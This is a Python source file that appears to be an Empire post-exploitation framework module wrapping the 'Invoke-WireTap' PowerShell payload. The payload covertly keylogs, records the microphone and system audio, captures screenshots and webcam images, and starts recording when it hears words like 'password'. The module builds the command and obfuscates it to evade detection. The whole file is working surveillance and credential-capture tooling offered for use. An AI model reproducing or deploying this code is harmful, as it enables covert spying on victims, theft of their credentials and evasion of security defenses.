from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-WireTap',

            # List of one or more authors for the module
            'Author': ['@mDoi12mdjf', '@S3cur3Th1sSh1t'],

            # More verbose multi-line description of the module
            'Description': ("WireTap is a .NET 4.0 project to consolidate several functions used to interact with a "
                            "user's hardware, including: Screenshots (Display + WebCam Imaging), Audio (Both line-in "
                            "and line-out), Keylogging, & Activate voice recording when the user says a keyword "
                            "phrase. Note: Only one method can be ran at a time."),

            'Software': '',

            'Techniques': ['T1123', 'T1125', 'T1056'],

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '4',

            # List of any references/other comments
            'Comments': [
                'https://github.com/djhohnstein/WireTap'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description': 'Agent to run on.',
                'Required': True,
                'Value': ''
            },
            'record_mic': {
                'Description': 'Record audio from the attached microphone (line-in).',
                'Required': False,
                'Value': 'True',
            },
            'record_sys': {
                'Description': 'Record audio from the system speakers (line-out).',
                'Required': False,
                'Value': '',
            },
            'record_audio': {
                'Description': 'Record audio from both the microphone and the speakers. Default: 10s',
                'Required': False,
                'Value': '',
            },
            'capture_screen': {
                'Description': "Screenshot the current user's screen.",
                'Required': False,
                'Value': '',
            },
            'capture_webcam': {
                'Description': "Capture images from the user's attached webcam (if it exists).",
                'Required': False,
                'Value': '',
            },
            'keylogger': {
                'Description': 'Begin logging keystrokes to a file.',
                'Required': False,
                'Value': '',
            },
            'listen_for_passwords': {
                'Description': "Listens for words 'username', 'password', 'login' and 'credential', "
                               "and when heard, starts an audio recording for two minutes.",
                'Required': False,
                'Value': '',
            },
            'time': {
                'Description': 'Time to record mic, sys, or audio. Time suffix can be s/m/h.',
                'Required': False,
                'Value': '10s',
            },
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        # First method: Read in the source script from module_source
        module_source = self.mainMenu.installPath + "/data/module_source/collection/Invoke-WireTap.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscationCommand)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code
        script_end = 'Invoke-WireTap -Command "'

        # Add any arguments to the end execution of the script
        for option, values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script_end += str(option)
                    elif option.lower() == "time":
                        # if we're just adding a switch
                        script_end += " " + str(values['Value'])
                    else:
                        script_end += " " + str(option) + " " + str(values['Value'])
        script_end += '"'

        if obfuscate:
            script_end = helpers.obfuscate(psScript=script_end, installPath=self.mainMenu.installPath,
                                           obfuscationCommand=obfuscationCommand)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
